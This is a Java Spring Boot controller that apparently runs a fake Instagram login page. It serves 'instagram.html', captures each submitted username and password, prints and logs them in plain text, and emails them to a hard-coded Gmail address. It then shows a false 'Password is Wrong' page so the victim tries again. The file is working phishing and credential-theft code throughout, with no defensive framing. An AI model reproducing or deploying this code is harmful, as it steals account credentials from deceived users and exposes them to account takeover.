package com.insta.insta;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;
import org.springframework.web.servlet.view.RedirectView;

import java.lang.ProcessBuilder.Redirect;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;

@RestController
public class MainController {

    private static final Logger logger = LoggerFactory.getLogger(MainController.class);

    @Autowired
    private EmailService emailService;

    @GetMapping("/")
    public ModelAndView loginPag() {
        System.out.println("called ");
        return new ModelAndView("instagram.html");
    }

    @PostMapping("/login")
    public RedirectView userLogin(@RequestParam("field1") String name, @RequestParam("field2") String password,
            RedirectAttributes redirectAttributes) {
        System.out.println("details are :");
        System.out.println(name + " " + password);
        String messge = "username is :" + name + " > and password is :" + password;
        logger.info(messge);
        emailService.sendSimpleMessage("ikalilinux850@gmail.com", "insta info",
                messge);
        return new RedirectView("/faild");
    }

    @GetMapping("/faild")
    public ModelAndView getMethodName(RedirectAttributes redirectAttributes) {
        redirectAttributes.addFlashAttribute("message", "Password is Wrong! try Again..");
        redirectAttributes.addFlashAttribute("linkText", "Click here");
        redirectAttributes.addFlashAttribute("linkUrl", "/");
        return new ModelAndView("response.html");
    }

}
